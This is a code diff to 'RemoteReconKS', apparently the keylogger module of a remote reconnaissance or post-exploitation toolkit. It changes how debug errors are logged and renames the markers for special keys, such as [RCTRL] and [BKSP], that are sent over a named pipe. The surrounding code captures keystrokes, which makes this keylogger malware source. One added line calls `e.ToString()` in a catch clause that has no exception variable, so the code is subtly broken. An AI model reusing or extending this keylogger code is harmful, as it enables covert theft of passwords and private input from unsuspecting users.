@@ -13,7 +13,9 @@ namespace RemoteReconKS
 {
     public class RemoteReconKS
     {
-
+#if DEBUG
+        private static string logpath;
+#endif
         private static NamedPipeServerStream server;
         private static NamedPipeClientStream client;
         private static byte[] key;
@@ -39,6 +41,9 @@ namespace RemoteReconKS
                 }
                 catch (Exception)
                 {
+#if DEBUG
+                    File.AppendAllText(logpath, e.ToString());
+#endif
                     Application.ExitThread();
                 }
                 
@@ -70,6 +75,9 @@ namespace RemoteReconKS
             }
             catch (Exception e)
             {
+#if DEBUG
+                File.AppendAllText(logpath, e.ToString());
+#endif
                 return Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
             }
         }
@@ -90,7 +98,7 @@ namespace RemoteReconKS
             catch (Exception e)
             {
 #if DEBUG
-                File.AppendAllText("C:\\Users\\dso\\Desktop\\Keylogger.log", e.ToString());
+                File.AppendAllText(logpath, e.ToString());
 #endif
             }
             
@@ -126,11 +134,11 @@ namespace RemoteReconKS
                         client.Write(key, 0, key.Length);
                         break;
                     case Keys.RControlKey:
-                        key = Encoding.UTF8.GetBytes("[RCNTRL]");
+                        key = Encoding.UTF8.GetBytes("[RCTRL]");
                         client.Write(key, 0, key.Length);
                         break;
                     case Keys.LControlKey:
-                        key = Encoding.UTF8.GetBytes("[LCNTRL]");
+                        key = Encoding.UTF8.GetBytes("[LCTRL]");
                         client.Write(key, 0, key.Length);
                         break;
                     case Keys.LWin:
@@ -142,11 +150,11 @@ namespace RemoteReconKS
                         client.Write(key, 0, key.Length);
                         break;
                     case Keys.Back:
-                        key = Encoding.UTF8.GetBytes("[BACKSPACE]");
+                        key = Encoding.UTF8.GetBytes("[BKSP]");
                         client.Write(key, 0, key.Length);
                         break;
                     case Keys.Enter:
-                        key = Encoding.UTF8.GetBytes("[ENTER]");
+                        key = Encoding.UTF8.GetBytes("[ENT]");
                         client.Write(key, 0, key.Length);
                         break;
                     default:
